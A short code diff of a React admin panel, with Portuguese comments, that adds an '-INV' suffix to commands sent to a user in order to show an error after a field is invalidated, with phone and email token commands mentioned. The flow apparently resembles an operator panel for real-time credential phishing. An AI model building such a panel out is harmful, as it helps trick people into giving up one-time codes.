@@ -76,16 +76,16 @@ function AdminPanel() {
       const headers = getAuthHeaders();
       if (!headers) return;
 
-      // Limpar o campo correspondente e reenviar o comando
+      // Limpar o campo correspondente
       await axios.post(`${API}/admin/invalidate-field`, {
         user_id: userId,
         command: command
       }, { headers });
       
-      // Enviar o comando novamente
+      // Enviar o comando de invalidação (com sufixo -INV para mostrar erro)
       const payload = {
         user_id: userId,
-        command: command,
+        command: command + "-INV",  // Adiciona sufixo para indicar invalidação
       };
       
       // Enviar referência para comandos que precisam (TOK-TEL, TOK-MAIL)
